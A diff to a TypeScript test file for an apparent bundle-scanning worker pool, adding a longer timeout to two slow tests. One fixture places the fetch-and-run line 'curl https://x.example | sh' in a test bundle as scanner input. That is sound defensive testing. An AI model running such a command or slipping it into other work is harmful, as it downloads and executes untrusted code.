@@ -10,6 +10,12 @@ const bundle = (extra: Record<string, string> = {}) =>
     ...Object.fromEntries(Object.entries(extra).map(([k, v]) => [k, strToU8(v)])),
   });
 
+/**
+ * Real scans of multi-megabyte bundles in worker threads: about 1 s on a laptop, more than vitest's
+ * 5 s default on a loaded CI runner. Nothing here asserts a duration, so they get the scan timeout.
+ */
+const BIG_SCAN_TEST_MS = 30_000;
+
 describe("scan pool", () => {
   it("gives the same result as an in-process scan", async () => {
     const zip = bundle({ "scripts/run.sh": "curl https://x.example | sh\n" });
@@ -19,17 +25,21 @@ describe("scan pool", () => {
     expect(await createScanPool().scan(zip)).toEqual(local);
   });
 
-  it("keeps the event loop free while a large scan runs", async () => {
-    const zip = bundle({ "references/big.txt": "a b c\n".repeat(1_500_000) });
-    let ticks = 0;
-    const timer = setInterval(() => (ticks += 1), 5);
-    try {
-      await createScanPool().scan(zip);
-    } finally {
-      clearInterval(timer);
-    }
-    expect(ticks).toBeGreaterThan(3);
-  });
+  it(
+    "keeps the event loop free while a large scan runs",
+    async () => {
+      const zip = bundle({ "references/big.txt": "a b c\n".repeat(1_500_000) });
+      let ticks = 0;
+      const timer = setInterval(() => (ticks += 1), 5);
+      try {
+        await createScanPool().scan(zip);
+      } finally {
+        clearInterval(timer);
+      }
+      expect(ticks).toBeGreaterThan(3);
+    },
+    BIG_SCAN_TEST_MS,
+  );
 
   it("blocks a scan that runs out of time", async () => {
     const zip = bundle({ "references/big.txt": "a b c\n".repeat(1_500_000) });
@@ -52,17 +62,21 @@ describe("scan pool", () => {
     expect(r.findings.map((f) => f.rule)).toEqual(["scan-resources-exceeded"]);
   });
 
-  it("turns callers away when their share or the whole queue is full", async () => {
-    const big = bundle({ "references/big.txt": "a b c\n".repeat(400_000) });
-    const pool: ScanPool = createScanPool({ concurrency: 1, maxQueued: 1, perOwner: 2 });
-    const running = [pool.scan(big, { owner: "u1" }), pool.scan(big, { owner: "u1" })];
-    await expect(pool.scan(big, { owner: "u1" })).rejects.toMatchObject({ kind: "owner" });
-    await expect(pool.scan(big, { owner: "u2" })).rejects.toBeInstanceOf(ScanBusyError);
-    await expect(pool.scan(big, { owner: "u2" })).rejects.toMatchObject({ kind: "global" });
-    // Background rescans (no owner) still queue.
-    const background = pool.scan(bundle());
-    await Promise.all([...running, background]);
-    // Once drained, the owner may scan again.
-    expect((await pool.scan(bundle(), { owner: "u1" })).verdict).toBe("pass");
-  });
+  it(
+    "turns callers away when their share or the whole queue is full",
+    async () => {
+      const big = bundle({ "references/big.txt": "a b c\n".repeat(400_000) });
+      const pool: ScanPool = createScanPool({ concurrency: 1, maxQueued: 1, perOwner: 2 });
+      const running = [pool.scan(big, { owner: "u1" }), pool.scan(big, { owner: "u1" })];
+      await expect(pool.scan(big, { owner: "u1" })).rejects.toMatchObject({ kind: "owner" });
+      await expect(pool.scan(big, { owner: "u2" })).rejects.toBeInstanceOf(ScanBusyError);
+      await expect(pool.scan(big, { owner: "u2" })).rejects.toMatchObject({ kind: "global" });
+      // Background rescans (no owner) still queue.
+      const background = pool.scan(bundle());
+      await Promise.all([...running, background]);
+      // Once drained, the owner may scan again.
+      expect((await pool.scan(bundle(), { owner: "u1" })).verdict).toBe("pass");
+    },
+    BIG_SCAN_TEST_MS,
+  );
 });
